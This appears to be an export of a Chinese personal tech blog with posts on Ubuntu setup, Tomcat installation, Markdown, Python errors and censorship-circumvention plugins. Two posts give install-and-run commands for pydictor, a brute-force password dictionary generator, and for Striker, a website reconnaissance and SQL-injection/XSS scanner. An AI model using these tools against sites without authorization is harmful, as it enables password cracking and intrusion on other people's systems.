    <content type="text"><![CDATA[我编程很渣，但我就是喜欢编程，我该怎么做？放弃还是继续坚持？如果坚持要如何做才能取得进步？编程很渣这事儿，如果你刚入门不久，很正常。新手码农，十人九渣，谁还没个刚出道，需要打怪升级的过程？从职业选择来讲，最重要的两件事：一是前途，就是有发展；二是钱途，就是能发财。在此基础上如果还能满足自己的志趣、发挥自己的擅长，那就非常完美了。程序员，从前途和钱途的角度来讲，都还不错，你又喜欢编程，大方向上没有问题，建议你继续坚持。俗话说，神枪手都是用子弹喂出来的，而代码这玩意儿，都是敲出来的。我在初学编程的阶段，感觉其实最重要的就两件事：一是，不断的去看别人的代码，去看那些非常优秀的大神的代码，去学他们的思路；二是，不断的去敲自己的代码，光看不练傻把式，去实践，去试错，去检验自己的想法。在这个过程中，不断的总结、反思，才能积累经验，提升能力。任何容易的事情，都不值钱。学习一门技能，从头开始，必然有一个艰难的阶段，如果碰到困难就放弃，坦白讲，你换另一个职业，如果再碰到困难呢？我们不是不能放弃，但至少是应该竭尽全力以后才放弃，证明自己人生有条路走不通，不是坏事，但前提是你经过了不懈的努力。学习，有很多种方式，要找到对自己而言最有效的。学编程，你可以看书，也可以找视频教程，还可以参加培训，如果条件允许，我比较建议你学习专业的培训课程，花钱买点时间，一个有经验的老师，一群志同道合的同学，会对你帮助很大。自己去摸索，有时候容易走弯路，而且孤身一人上路，毕竟是孤独和寂寞的。如果条件不具备，你不知道应该学什么，应该怎么学，学习的内容，你可以参照培训机构的课程体系，现在网络上的学习资源也很多，可以找到很多视频资料，也可以加入相应的Q群，多去和业内的人交流请教。不要买本书，坐在电脑前封闭自己，一旦碰到瓶颈，就开始自我否定，要去寻找方法很重要。学什么，参照招聘要求来学，不要瞎学乱学什么都想学。知识永远学不完，但是人的生命是有限的，不要浪费自己的时间，把有限的生命放在必要的知识学习中去，参照招聘网站你所学习的编程语言，初级职位的招聘要求，多看几家，比较其中的共性，就是你必须掌握的内容，针对性的去学习，才能学位所用！今天突然读到了这篇文章，感觉写的特别好，我看后感觉很受用，因为我就是这种喜欢编程但是编程又特别渣的人。这篇文章写的道理是很对的，所以我将本篇文章摘抄到博客中，希望大家如果真的喜欢编程或者计算机网络的话，请一定不要轻易放弃努力，遇到问题不要害怕，有些时候是自己把自己吓倒了。我在学习中，也遇到很多的问题，就比如我搭建本博客时候，我当初遇到一个问题，就是无论如何也无法将本地内容提交到GitHubpages上去，GitHub上虽然给了报错，但是我英语并不是太好，我根本看不懂是什么意思，在线翻译也不对，百度也找不到任何解决办法，我也去CSDN社区上求助。最后我开始寻找各种建站教程，一点一点的看，才知道，是我的域名根本没有解析成功，因为没有进行实名认证。最后，我成功解析后，才完美运行本博客。现在懂了很多建站知识，发现自己这些问题真的太笨了。但是学习就是这样，没有遇到问题绝对不会有任何进步的。成功一定建立在你的挫折上。所以以本文与各位勉励，希望不要轻言放弃。这条路很长，但是也很有意思。如果你遇到什么问题，你可以加群与我们进行讨论，我必定会不遗余力的帮助你的。不去追逐，永远不会拥有。不往前走，永远原地停留。没有所谓失败，除非你不再尝试。 扫码进群，我等待你的加入]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu安装web服务器Tomcat]]></title>
    <url>%2F2018%2F04%2F15%2FUbuntu%E5%AE%89%E8%A3%85web%E6%9C%8D%E5%8A%A1%E5%99%A8Tomcat%2F</url>
    <content type="text"><![CDATA[Tomcat 服务器是一个免费的开放源代码的Web 应用服务器。Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP规范总是能在Tomcat 中得到体现。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。Tomcat 是一个轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。Tomcat服务器必须运行于java环境。所以应该首先安装java环境，我们安装jdk(Java Development Kit),jdk提供了java运行和编译的各种工具和运行库。本教程的环境为虚拟机下的64位Ubuntu16.04，但是其他的Linux发行版本也是适用的。 配置jdk环境查看当前系统是否已经安装了Java环境1lengyue@ubuntu:~$ java -version 看到这样的界面就是说明当前系统并没有Java环境。Java 有 2 个，一个是openjava，一个是oracle的java。我们用Oracle的。我们可以点击此链接: http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html进行下载。由于我是64位Ubuntu的环境，所以我选择以下版本。需要根据自己的主机环境进行下载安装。在/usr/lib/目录下创建一个jdk文件夹,并将下载好的jdk压缩包解压到/usr/lib/jdk/.12345678lengyue@ubuntu:~$ sudo mkdir /usr/lib/jdklengyue@ubuntu:~$ cd /tmp/mozilla_lengyue0lengyue@ubuntu:/tmp/mozilla_lengyue0$ lsjdk-8u161-linux-x64.tar.gzlengyue@ubuntu:/tmp/mozilla_lengyue0$ sudo tar zxvf jdk-8u161-linux-x64.tar.gz -C /usr/lib/jdk/lengyue@ubuntu:~$ cd /usr/lib/jdk/lengyue@ubuntu:/usr/lib/jdk$ lsjdk1.8.0_161 然后我们需要配置jdk环境变量1lengyue@ubuntu:~$ sudo gedit etc/profile 我们需要向文件中添加如下代码123456JAVA_HOME=/usr/lib/jdk/jdk1.8.0_161JRE_HOME=$JAVA_HOME/jreJAVA_BIN=$JAVA_HOME/binCLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar:$JRE_HOME/libPATH=$PATH:$JAVA_HOME/bin:$JRE_HOME/binexport JAVA_HOME JRE_HOME PATH CLASSPATH 注意：该段代码需要缩进相同，并且顶格写，而已写在最上面，不能添加到判断语句中，图中画红线标注的地方特别需要注意，应该和你的jdk的文件夹的路径保持一致。保存后，我们开始运行重新编译一下，使之生效。12lengyue@ubuntu:~$ source /etc/profilelengyue@ubuntu:~$ java -version 如图所示就是成功安装的样子。 安装并配置Tomcat我们直接到官网下载tomcat的软件包。选择适合自己系统的版本即可。地址: http://tomcat.apache.org/本次我使用8.0.20的版本。解压至/usr/local/目录下。1lengyue@ubuntu:~$ sudo tar zxvf apache-tomcat-8.0.20.tar.gz -C /usr/local/ 然后创建一个符号链接(这一步只是为了便捷使用，可以忽略不做的)1lengyue@ubuntu:~$ sudo ln -s /usr/local/apache-tomcat-8.0.20 /usr/local/tomcat 然后编辑配置文件，使得tomcat可以成功运行在java环境下。1lengyue@ubuntu:~$ sudo gedit /usr/local/tomcat/bin/startup.sh 向里面添加如下代码1234567#set java environmentexport JAVA_HOME=/usr/lib/jdk/jdk1.8.0_161export JRE_HOME=$&#123;JAVA_HOME&#125;/jreexport CLASSPATH=.:%&#123;JAVA_HOME&#125;/lib:%&#123;JRE_HOME&#125;/libexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH#tomcatexport TOMCAT_HOME=/usr/local/apache-tomcat-8.0.20 代码的格式以及要求和刚才的添加jdk环境变量的一样。图中的画红线的地方也是你软件包所在的目录路径，一定要和你的安装路径保持相同。保存退出后，我们开始运行tomcat。1lengyue@ubuntu:~$ sudo /usr/local/tomcat/bin/startup.sh 可以看到tomcat已经开始运行了。然后我们在浏览器打开如下地址: http://127.0.0.1:8080/tomcat默认运行于8080端口，可以通过更改配置文件修改运行端口。看到如下画面就说明已经成功安装。 本文重点内容为了各位更好的理解tomcat的安装以及运行机理，下面我要重点讲解一下本文中的2处添加代码的作用以及代码本身的意思。希望可以仔细阅读本处内容，因为这个真的很重要。 /etc/profile中的代码在Linux中/etc/profile文件涉及的是环境变量。Linux是一个多用户的操作系统。每个用户登录系统后，都会有一个专用的运行环境。通常每个用户默认的环境都是相同的，这个默认环境实际上就是一组环境变量的定义。用户可以对自己的运行环境进行定制，其方法就是修改相应的系统环境变量。我们通过修改/etc/profile文件，在这里修改的内容是对所有用户起作用的。也就是不论本机中的哪个用户登陆进入系统，我们设置的java环境他都是可以运行的。当然我们需要有权限修改此文件，只有系统管理员可以修改，普通用户只有读的权限，不具备进行修改与运行的权限。常见的环境变量PATH：决定了shell将到哪些目录中寻找命令或程序，HOME：当前用户主目录，BIN：二进制文件。在添加的代码 中，每行开头的大写字母都表示环境变量，等号后的内容是文件路径，eg：JRE_HOME=$JAVA_HOME/jre，在第一行中JAVA_HOME=/usr/lib/jdk/jdk1.8.0_161,所以JRE_HOME=/usr/lib/jdk/jdk1.8.0_161/jre。其实JRE_HOME的路径是/usr/lib/jdk/jdk1.8.0_161/jre。那为什么不直接写出完整的路径呢？因为我们在修改配置文件前，是不知道JAVA_HOME路径的，我们这么写，其实是个相对路径，我们只需要更改JAVA_HOME路径，一定可以得到JRE_HOME的路径。其他代码的和该例一样。最好一行的export用于设置或显示环境变量。 tomcat中的startup.sh代码export后的全部是环境变量。在shell编程中，在shell中执行程序时，shell会提供一组环境变量。export可新增，修改或删除环境变量，供后续执行的程序使用。export的效力仅及于该次登陆操作。所以那段代码的作用就是使当前运行的脚本找到需要的运行环境。而且这个startup.sh是一个汇总的脚本，脚本中包含了很多需要调用的配置文件以及脚本，大部分都是各种变量，这些变量存在于tomcat的安装文件中，分布于各处，各司其职，每个都需要完成一定的作用。而startup.sh则是调用tomcat中所有的文件。说这么多，你如果明白一个程序运行的机理以及各个文件夹的作用。理解这些是相当简单的。扫码进群，我等待你的加入。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[科学上网教程2-使用插件]]></title>
    <url>%2F2018%2F04%2F13%2F%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%95%99%E7%A8%8B2-%E4%BD%BF%E7%94%A8%E6%8F%92%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[今天介绍2款插件，我本人目前也有在用。我个人感觉特别简单易用，而且有提供免费的服务器，当然你也可以买付费版的。但是我个人感觉免费的已经完全够你个人使用了。上次的不能看视频，这次的可以看。Tips: 本插件只使用于火狐浏览器或者使用火狐浏览器内核的浏览器。下次我会介绍谷歌浏览器以及使用谷歌浏览器内核的浏览器插件。首先进入附加组件，搜索”vpn”.我个人推荐下面2款插件。下面我以”hoxx”为例进行操作，另外一款插件的操作和它一摸一样，就不再赘述。然后安装打开，开始注册账户，这2个插件都是支持QQ邮箱注册的，当你注册后，它会向你的邮箱里发一份邮件，邮件中包含了你的账户以及密码。然后开始登陆你的账户。接着选择免费服务器，选择国家，我个人推荐美国的与香港的，他们的连接速度都很快。选中后，就会开始进行连接。连接成功就是下图这样。然后我们开始打开谷歌，YouTube。 扫码进群，我等待你的加入。]]></content>
      <categories>
        <category>科学上网</category>
      </categories>
      <tags>
        <tag>Google</tag>
        <tag>科学上网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[科学上网教程1-使用谷歌镜像]]></title>
    <url>%2F2018%2F04%2F11%2F%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%95%99%E7%A8%8B1-%E4%BD%BF%E7%94%A8%E8%B0%B7%E6%AD%8C%E9%95%9C%E5%83%8F%2F</url>
    <content type="text"><![CDATA[科学上网其实并没有你想象中的那么困难，即使墙很厚，方法还是很多的，我会写一系列教程教会你的，总有一种方法适合你。今天说一下，最简单的一种方法—利用谷歌镜像实现。我已经把网址添加到了博客的在线工具栏目中了，你要想使用可以去那里找，几个网站我都测试过了，都是完全可以用的，不要再问我不能打开的原因了，原因只有一个，你家的网速太慢了。对了，提醒一下各位，不要试图去找视频看，这种站点只适合搜索一些信息，不适合看视频，网速根本达不到要求。而且不要过度使用这些网站，网站也许就因为你的过度使用被屏蔽。如果你想看视频，那么等以后教程吧。 扫码进群，我等待你的加入。]]></content>
      <categories>
        <category>科学上网</category>
      </categories>
      <tags>
        <tag>Google</tag>
        <tag>科学上网</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个强大实用的黑客暴力破解字典建立工具]]></title>
    <url>%2F2018%2F04%2F10%2F%E4%B8%80%E4%B8%AA%E5%BC%BA%E5%A4%A7%E5%AE%9E%E7%94%A8%E7%9A%84%E9%BB%91%E5%AE%A2%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%AD%97%E5%85%B8%E5%BB%BA%E7%AB%8B%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[虽然kali已经自带了一款十分强大的字典生成工具crunch，但是今天想说的这一款工具丝毫不逊色于crunch。而且我本人十分喜欢这款工具，字典自定义的空间十分大，可以根据需求生成各种各样的字典。一般来说，自定义空间大的工具都是好工具。项目地址: https://github.com/LandGrey/pydictor不用图文教程了，直接上视频。这是安装与运行的命令:1234git clone --depth=1 --branch=master https://www.github.com/landgrey/pydictor.gitcd pydictor/chmod 755 pydictor.pypython pydictor.py 更多操作请查看官方示例文档: https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md 扫码进群]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux的硬链接与软链接]]></title>
    <url>%2F2018%2F04%2F10%2FLinux%E7%9A%84%E7%A1%AC%E9%93%BE%E6%8E%A5%E4%B8%8E%E8%BD%AF%E9%93%BE%E6%8E%A5%2F</url>
    <content type="text"><![CDATA[首先什么是链接？链接操作实际上是给系统中已有的某个文件指定另外一个可用于访问它的名称。对于这个新的文件名，我们可以为之指定不同的 访问权限 ，以控制对信息的共享和安全性的问题。 如果链接指向目录，用户就可以利用该链接直接进入被链接的目录而不用打一大堆的路径名。而且，即使我们删除这个链接，也不会破坏原来的目录。 硬链接硬链接只能引用同一文件系统中的文件。它引用的是文件在文件系统中的物理索引(也称为 inode)。当您移动或删除原始文件时，硬链接不会被破坏，因为它所引用的是文件的物理数据而不是文件在文件结构中的位置。硬链接的文件不需要用户有访问原始文件的权限，也不会显示原始文件的位置，这样有助于文件的安全。如果您删除的文件有相应的硬链接，那么这个文件依然会保留，直到所有对它的引用都被删除。 软链接（符号链接）软连接，其实就是新建立一个文件，这个文件就是专门用来指向别的文件的（那就和windows 下的快捷方式的那个文件有很接近的意味）。软连接产生的是一个新的文件，但这个文件的作用就是专门指向某个文件的，删了这个软连接文件，那就等于不需要这个连接，和原来的存在的实体原文件没有任何关系，但删除原来的文件，则相应的软连接不可用（cat那个软链接文件，则提示“没有该文件或目录“）。 硬链接与软链接的区别分类比较:硬连接是不会建立inode的，他只是在文件原来的inode link count域再增加1而已，也因此硬链接是不可以跨越文件系统的。相反都是软连接会重新建立一个inode，当然inode的结构跟其他的不一样，他只是一个指明源文件的字符串信息。一旦删除源文件，那么软连接将变得毫无意义。而硬链接删除的时候，系统调用会检查inode link count的数值，如果他大于等于1，那么inode不会被回收。因此文件的内容不会被删除。硬链接实际上是为文件建一个别名，链接文件和原文件实际上是同一个文件。可以通过ls -i来查看一下，这两个文件的inode号是同一个，说明它们是同一个文件；而软链接建立的是一个指向，即链接文件内的内容是指向原文件的指针，它们是两个文件。 软链接可以跨文件系统，硬链接不可以；软链接可以对一个不存在的文件名(filename)进行链接（当然此时如果你vi这个软链接文件，linux会自动新建一个文件名为filename的文件）,硬链接不可以（其文件必须存在，inode必须存在）；软链接可以对目录进行连接，硬链接不可以。两种链接都可以通过命令 ln 来创建。ln 默认创建的是硬链接。使用 -s 开关可以创建软链接。 综合比较:软连接可以跨文件系统，硬连接不可以硬连接不管有多少个，都指向的是同一个 I 节点，会把结点连接数增加，只要结点的连接数不是 0 ，文件就一直存在不管你删除的是源文件还是连接的文件。只要有一个存在文件就存在。 当你修改源文件或者连接文件任何一个的时候，其他的文件都会做同步的修改。软链接不直接使用 i 节点号作为文件指针 , 而是使用文件路径名作为指针。所以删除连接文件对源文件无影响，但是删除源文件，连接文件就会找不到要指向的文件。软链接有自己的 i 节点 , 并在磁盘上有一小片空间存放路径名。软连接可以对一个不存在的文件名进行连接 。软连接可以对目录进行连接。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python常见报错收集整理]]></title>
    <url>%2F2018%2F04%2F09%2Fpython%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99%E6%94%B6%E9%9B%86%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[SyntaxError: EOL while scanning string literal python中字符串的最后一个字符是斜杠会导致出错 行连续字符后的以外字符BaseException 所有异常的基类SystemExit 解释器请求退出KeyboardInterrupt 用户中断执行(通常是输入ctr+C)Exception 常规错误的基类StopIteration 迭代器没有更多的值GeneratorExit 生成器(generator)发生异常来通知退出StandardError 所有的内建标准异常的基类ArithmeticError 所有数值计算错误的基类FloatingPointError 浮点计算错误OverflowError 数值运算超出最大限制ZeroDivisionError 除(或取模)零 (所有数据类型)AssertionError 断言语句失败AttributeError 对象没有这个属性EOFError 没有内建输入,到达EOF标记EnvironmentError 操作系统错误的基类IOError 输入/输出操作失败OSError 操作系统错误WindowsError 系统调用失败ImportError 导入模块/对象失败LookupError 无效数据查询的基类IndexError 序列中没有此索引(index)KeyError 映射中没有这个键MemoryError 内存溢出错误(对于Python 解释器不是致命的)NameError 未声明/初始化对象 (没有属性)UnboundLocalError 访问未初始化的本地变量ReferenceError 弱引用(Weak reference)试图访问已经垃圾回收了的对象RuntimeError 一般的运行时错误NotImplementedError 尚未实现的方法SyntaxErrorPython 语法错误IndentationError 缩进错误TabErrorTab 和空格混用SystemError 一般的解释器系统错误TypeError 对类型无效的操作ValueError 传入无效的参数UnicodeErrorUnicode 相关的错误UnicodeDecodeErrorUnicode 解码时的错误UnicodeEncodeErrorUnicode 编码时错误UnicodeTranslateErrorUnicode 转换时错误Warning 警告的基类DeprecationWarning 关于被弃用的特征的警告FutureWarning 关于构造将来语义会有改变的警告OverflowWarning 旧的关于自动提升为长整型(long)的警告PendingDeprecationWarning 关于特性将会被废弃的警告RuntimeWarning 可疑的运行时行为(runtime behavior)的警告SyntaxWarning 可疑的语法的警告UserWarning 用户代码生成的警告]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[markdown语法如何显示html标签和转义字符]]></title>
    <url>%2F2018%2F04%2F08%2Fmarkdown%E8%AF%AD%E6%B3%95%E5%A6%82%E4%BD%95%E6%98%BE%E7%A4%BAhtml%E6%A0%87%E7%AD%BE%E5%92%8C%E8%BD%AC%E4%B9%89%E5%AD%97%E7%AC%A6%2F</url>
    <content type="text"><![CDATA[Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。Markdown语法中而已内嵌html和js代码，仍然可以表现出html和js代码的效果。而不会只生成文本内容。一般都会采用Markdown语法进行写博客，比如我个人的博客就一直采用Markdown语法进行写作。它的语法特点是可以采用简洁的格式就可以生成html代码，写作者不用顾虑html的样式，而更加专注于写作本身。但是由于可以内嵌html代码的特性，使得你写入的html标签和转义字符被默认为网页的html代码，而不是文本内容。 显示html标签就比如我要写出文本的标签&lt;br&gt; &lt;/br&gt; 。我如果不使用转义字符的话，会出现一片空白，该代码没有生成博客文章中的文本内容，而是成为了网页源码中的html代码标签了。所以你如果想在博文页面显示&lt;br&gt;就必须采用转义字符。在用Markdown语法写作的时候，将&lt;和&gt;分别写成转义字符的形式，写为如下形式:1&amp;lt;br&amp;gt; 1234567显示结果 描述 实体名称 实体编号 空格 &amp;nbsp; &amp;#160;&lt; 小于号 &amp;lt; &amp;#60;&gt; 大于号 &amp;gt; &amp;#62;&amp; 和号 &amp;amp; &amp;#38;“ 引号 &amp;quot; &amp;#34;‘ 撇号 &amp;apos;(IE不支持) &amp;#39; 显示转义字符下面问题又来了，我们可以使用转义字符来代替标签的符号，如果我们要写出转义字符本身呢?比如我要写出&lt;的转义字符:&amp;lt;那么我们可以这样写1&amp;amp;lt; 也就是转义字符的”&amp;”我们使用转义字符进行转义，但是后面的字母我们进行保留，这样就可以把转义字符也完全写出来了。这里有一个html转义字符的对照表:(作为参考)http://tool.oschina.net/commons?type=2]]></content>
      <categories>
        <category>Markdown</category>
      </categories>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu美化教程3-安装GTK3主题Numix]]></title>
    <url>%2F2018%2F04%2F07%2FUbuntu%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B3-%E5%AE%89%E8%A3%85GTK3%E4%B8%BB%E9%A2%98Numix%2F</url>
    <content type="text"><![CDATA[这次美化用xfce桌面，因为这款美化的主题我感觉最适合的是xfce桌面。xfce是一个轻量级的类Unix的桌面系统。 安装xfce桌面12lengyue@ubuntu:~$ sudo apt-get updatelengyue@ubuntu:~$ sudo apt-get install xfce4 安装Numix主题123lengyue@ubuntu:~$ sudo apt-add-repository ppa:numix/ppalengyue@ubuntu:~$ sudo apt-get updatelengyue@ubuntu:~$ sudo apt-get install numix-gtk-theme numix-icon-theme-circle 安装xfce主题管理123lengyue@ubuntu:~$ sudo add-apt-repository ppa:rebuntu16/other-stufflengyue@ubuntu:~$ sudo apt-get updatelengyue@ubuntu:~$ sudo apt-get install xfce-theme-manager 重启系统选择xfce桌面环境 设置Numix主题打开xfce桌面管理1lengyue@ubuntu:~$ xfce-theme-manager 设置主题样式 设置图标样式 设置鼠标样式 展示几张完成的图片作为参考]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一款网站信息与漏洞扫描工具]]></title>
    <url>%2F2018%2F04%2F05%2F%E4%B8%80%E6%AC%BE%E7%BD%91%E7%AB%99%E4%BF%A1%E6%81%AF%E4%B8%8E%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[不多说，直接开始安装(故作高冷的样子)项目地址: https://github.com/UltimateHackers/Striker1234root@kali:~# git clone https://github.com/UltimateHackers/Strikerroot@kali:~# cd Strikerroot@kali:~# pip install -r requirements.txtroot@kali:~# python striker.py 这个工具真的特别好使，你只需要输入目标网址，即可自动快速扫描网站信息，非常全面详细，如果被检测是以word press作为CMS搭建的网站，会为你自动运行kali中的wpsacn进行扫描。 特点:1.检测是否采用了Cloudflare网站安全服务2.检测服务器和网站使用的平台3.web服务器的操作系统4.检测CMS系统(支持超过197个)5.如果被检测是以word press作为CMS搭建的网站，会为你自动运行wpsacn进行扫描6.检索出robots.txt文件7.whois查询8.检测目标网站是否一个蜜罐9.检测开放端口10.导出所有的DNS记录11.生成可视化攻击表面的地图12.收集与目标网站有关的Emails13.查找在同一Web服务器上承载的网站(可以进行旁注)14.使用谷歌搜索出主机15.抓取网站具有特定参数的url16.在线使用sqlmap扫描sql注入漏洞(小于3分钟时间)17.检测基本的xss漏洞注释:以上信息全部来自GitHub项目上的有关介绍 以下是操作截图:]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu换源]]></title>
    <url>%2F2018%2F04%2F05%2Fubuntu%E6%8D%A2%E6%BA%90%2F</url>
    <content type="text"><![CDATA[Ubuntu的换源相对于其他版本的Linux容易的多，你不必打开源文件，可以直接去软件中心就可以修改了。打开软件中心，点击左上角，有个软件与更新，点击进去。接下来按图示操作。他会自动为你测试最合适的软件源。但是这里有必要说明一点，就是你的虚拟机如果用的是nat模式的话，它不能检测出最合适的软件源，所以网络连接使用桥接模式。测试完成后，你可以选择那个软件源进行设置，这个时候你需要输入用户口令进行认证一下。然后你选择close，会提示你要从新添加或更改的源安装软件和更新，您必须重新加载有关可用软件的信息。你选择reload，重新载入进行更新，然后默默等待更新完成就可以了。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[给win10子系统换源]]></title>
    <url>%2F2018%2F04%2F05%2F%E7%BB%99win10%E5%AD%90%E7%B3%BB%E7%BB%9F%E6%8D%A2%E6%BA%90%2F</url>
    <content type="text"><![CDATA[由于我只在自己的win10上安装了Ubuntu，其他版本的子系统没安装，所以我只演示Ubuntu换源的方法。其余版本的子系统可以参考本教程，找到国内的软件源进行更换就可以了。这些子系统默认的源都是国外的，你在下载软件或者更新系统的时候特别缓慢，所以换源是你使用Linux系统必不可少的一步。接下来介绍2种方法用于换源，你只需学会一种就可以了。 win10文件换源win10子系统的源文件路径为C:\Users\Username\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\etc\apt\sources.list (Username替换为你的主机的用户名)这些是隐藏文件，需要打开隐藏文件才可以找得到。你用编辑器打开,就可以看到那些默认的源了。你把原来的源用#注释掉，注意请不要直接删除原来的源，然后把下面的源复制进去，保存就可以了。1234567891011deb http://mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiversedeb-src http://mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiversedeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiversedeb-src http://mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiversedeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiversedeb-src http://mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiversedeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse 以上是中科大的最新的16.04的源，用的是HTTP协议。我看到有人说Win10的子系统，并没有安装apt-transport-https，所以说不支持HTTPS，但这个源我用的是http协议的，所以你不必为此而发愁。 在终端执行以下命令进行更新即可。1sudo apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade 终端换源在终端输入以下命令1sudo vim /etc/apt/sources.list 点击’i’进入vim的插入模式把刚才的源编辑进去，然后按esc，用：wq保存即可。然后开始更新源列表及更新系统1sudo apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade 初次更新也许时间会久一点，耐心等待就可以了。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Win10子系统安装图形化界面]]></title>
    <url>%2F2018%2F04%2F05%2FWin10%E5%AD%90%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2%2F</url>
    <content type="text"><![CDATA[Tips：在你开始操作之前，请确认你已经更换过软件源了，如果没有，点此链接查看换源操作。因为不换源的话，你会发现好多东西根本安装不了，下载速度巨慢。 安装xorgxorg是xfce桌面需要的一个基础依赖性质东西，开机时候提供登陆界面.1sudo apt-get install xorg 安装xfce4桌面系统1sudo apt-get install xfce4 安装xrdpXrdp允许Windows或Linux系统通过远程桌面的方式来访问另外一台主机，特别适合本地虚拟机使用。1sudo apt-get install xrdp 设置使用3390为远程端口1sudo sed -i &apos;s/port=3389/port=3390/g&apos; /etc/xrdp/xrdp.ini 向xsession中写入xfce4-session1sudo echo xfce4-session &gt;~/.xsession 重启xrdp服务1sudo service xrdp restart 好了，完成，现在开始远程连接桌面。win+R,输入mstsc.查看你电脑的IP地址，必须是内网IP地址啊，并且输入刚才设置的3390远程端口。然后进行连接。接下来开始登陆。WARNING:由于远程后就无法使用截图了，所以我拍照展示，拍照水平渣，将就看。输入你的用户名和密码，登陆进去即可。以后你再次远程的时候，一定要先执行sudo service xrdp restart，开启远程服务。 以下是我登陆进去后的图片，参考使用。]]></content>
      <categories>
        <category>ubuntu</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu桌面美化教程2-把Ubuntu改造为Mac OS X]]></title>
    <url>%2F2018%2F04%2F04%2FUbuntu%E6%A1%8C%E9%9D%A2%E7%BE%8E%E5%8C%96%E6%95%99%E7%A8%8B2-%E6%8A%8AUbuntu%E6%94%B9%E9%80%A0%E4%B8%BAMac%20OS%20X%2F</url>
    <content type="text"><![CDATA[教各位打造一个仿Mac OS X界面的Ubuntu。当然你如果侧重点是Linux的实用性，并不在意系统的颜值，可以不看本教程。以前的Linux并不做桌面的，只是这些年来做了仿windows的桌面。在真正的运维工作中也没有必要搞这些没用的东西是吧，自己在下面玩玩就可以了。好了，不说废话，直接开始。 安装macbuntu主题与图标1lengyue@ubuntu:~$ sudo add-apt-repository ppa:noobslab/macbuntu ## 添加ppa仓库 12lengyue@ubuntu:~$ sudo apt-get update ## 更新使之生效lengyue@ubuntu:~$ sudo apt-get install macbuntu-os-icons-lts-v7 ##安装mac图标 1lengyue@ubuntu:~$ sudo apt-get install macbuntu-os-ithemes-lts-v7 ## 安装mac主题 安装 Slingscold(替代Launchpad)123lengyue@ubuntu:~$ sudo add-apt-repository ppa:noobslab/macbuntulengyue@ubuntu:~$ sudo apt-get updatelengyue@ubuntu:~$ sudo apt-get install slingscold 安装Albert Spotlight(替代 Mac Spotlight)123lengyue@ubuntu:~$ sudo add-apt-repository ppa:noobslab/macbuntulengyue@ubuntu:~$ sudo apt-get update lengyue@ubuntu:~$ sudo apt-get install albert 安装 Plank Dock1lengyue@ubuntu:~$ sudo apt-get install plank 安装 Plank 主题123lengyue@ubuntu:~$ sudo add-apt-repository 